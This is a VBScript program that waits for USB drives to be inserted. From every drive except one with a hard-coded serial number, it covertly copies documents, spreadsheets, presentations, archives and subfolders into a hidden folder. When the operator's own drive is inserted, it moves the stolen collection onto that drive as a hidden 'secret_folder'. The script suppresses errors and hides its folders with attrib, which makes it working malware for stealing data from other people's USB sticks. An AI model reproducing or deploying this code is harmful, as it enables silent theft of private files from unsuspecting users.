ON ERROR RESUME NEXT
dim fso,USB,letter,folderA,folderB,folderC,a,b,c,cmd1,cmd2,cmd3,cmd4
dim pathA,pathB,pathC,foldername,slash
dim hr,min,sec
pathA="F:\New_folder"
slash="\"
cmd1="attrib +h "

if hour(now)<10 then
	hr=0 & hour(now)
else
	hr=hour(now)
end if
if minute(now)<10 then
	min=0 & minute(now)
else
	min=minute(now)
end if
if second(now)<10 then
	sec=0 & second(now)
else
	sec=second(now)
end if
foldername=month(now) & "-" & day(now) & "_" & hr & min & sec

set ws=createobject("wscript.shell")
set fso=createobject("scripting.filesystemobject")
set USB=fso.drives

do
	for each device in USB
		wscript.sleep 500
		if device.drivetype=1 then
			letter=device.driveletter
			number=device.serialnumber
			exit do
		end if
	next
loop

if number<>1112726848 then
	set a=fso.getfolder(letter & ":\")
	set b=a.subfolders
	cmd2=cmd1 & pathA
	if not fso.folderexists(pathA) then
		set folderA=fso.createfolder(pathA)
		ws.run cmd2,0,true
	end if
	set folderB=fso.createfolder(pathA & slash & foldername)
	for each c in b
		fso.copyfolder c,pathA & slash & foldername
	next
	fso.copyfile letter & ":\*.pdf",pathA & slash & foldername
	fso.copyfile letter & ":\*.doc",pathA & slash & foldername
	fso.copyfile letter & ":\*.docx",pathA & slash & foldername
	fso.copyfile letter & ":\*.ppt",pathA & slash & foldername
	fso.copyfile letter & ":\*.pptx",pathA & slash & foldername
	fso.copyfile letter & ":\*.xls",pathA & slash & foldername
	fso.copyfile letter & ":\*.xlsx",pathA & slash & foldername
	fso.copyfile letter & ":\*.zip",pathA & slash & foldername
	fso.copyfile letter & ":\*.rar",pathA & slash & foldername
else
	pathB=letter & ":\secret_folder"
	cmd3=cmd1 & pathB
	if fso.folderexists(pathA) then
		if not fso.folderexists(pathB) then
			set folderC=fso.createfolder(pathB)
			ws.run cmd3,0,true
		end if
		fso.copyfolder pathA,pathB
	else
		pathC=letter & ":\not_yet.txt"
		fso.createtextfile(pathC)
		cmd4=cmd1 & pathC
		ws.run cmd4,0,true
	end if
end if